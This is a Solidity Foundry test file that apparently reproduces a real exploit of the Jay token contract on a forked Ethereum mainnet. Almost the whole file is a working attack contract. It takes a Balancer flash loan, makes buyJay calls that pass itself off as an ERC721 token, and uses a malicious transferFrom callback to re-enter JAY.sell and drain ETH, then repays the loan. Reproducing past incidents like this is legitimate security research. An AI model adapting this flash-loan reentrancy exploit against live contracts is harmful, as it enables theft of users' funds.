// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1608372475225866240

// @TX
// https://etherscan.io/tx/0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6

interface IJay {
    function buyJay(
        address[] memory erc721TokenAddress,
        uint256[] memory erc721Ids,
        address[] memory erc1155TokenAddress,
        uint256[] memory erc1155Ids,
        uint256[] memory erc1155Amounts
    ) external payable;
    function sell(uint256 value) external;
    function balanceOf(address account) external view returns (uint256);
}


contract ContractTest is DSTest{
    IJay JAY = IJay(0xf2919D1D80Aff2940274014bef534f7791906FF2);
    IBalancerVault Vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    WETH weth = WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 16288199);    // Fork mainnet at block 16288199
    }

    function testExploit() public {
        payable(address(0)).transfer(address(this).balance);
        emit log_named_decimal_uint(
            "[Start] ETH balance before exploitation:",
            address(this).balance,
            18
        );
        // Setup up flashloan paramaters.
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth); 
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 72.5 ether;
        bytes memory b = "0x000000000000000000000000000000000000000000000001314fb37062980000000000000000000000000000000000000000000000000002bcd40a70853a000000000000000000000000000000000000000000000000000030927f74c9de00000000000000000000000000000000000000000000000000006f05b59d3b200000";
        // Execute the flashloan. It will return in receiveFlashLoan()
        Vault.flashLoan(address(this), tokens, amounts, b);
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        require(msg.sender == address(Vault));

        // Transfer WETH to ETH and start the attack.
        weth.withdraw(amounts[0]);

        JAY.buyJay{value: 22 ether}(new address[](0),new uint256[](0),new address[](0),new uint256[](0),new uint256[](0));

        address[] memory erc721TokenAddress = new address[](1);
        erc721TokenAddress[0] = address(this);

        uint256[] memory erc721Ids = new uint256[](1);
        erc721Ids[0]= 0;
        
        JAY.buyJay{value: 50.5 ether}(erc721TokenAddress, erc721Ids,new address[](0),new uint256[](0),new uint256[](0));
        JAY.sell(JAY.balanceOf(address(this)));
        JAY.buyJay{value: 3.5 ether}(new address[](0),new uint256[](0),new address[](0),new uint256[](0),new uint256[](0));
        JAY.buyJay{value: 8 ether}(erc721TokenAddress,erc721Ids,new address[](0),new uint256[](0),new uint256[](0));
        JAY.sell(JAY.balanceOf(address(this)));

        // Repay the flashloan by depositing ETH for WETH and transferring.
        address(weth).call{value: 72.5 ether}("deposit");
        weth.transfer(address(Vault), 72.5 ether);

        emit log_named_decimal_uint(
            "[End] ETH balance after exploitation:",
            address(this).balance,
            18
        );
    }
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
            JAY.sell(JAY.balanceOf(address(this)));  // reenter call JAY.sell
    }
  receive() external payable {}
}




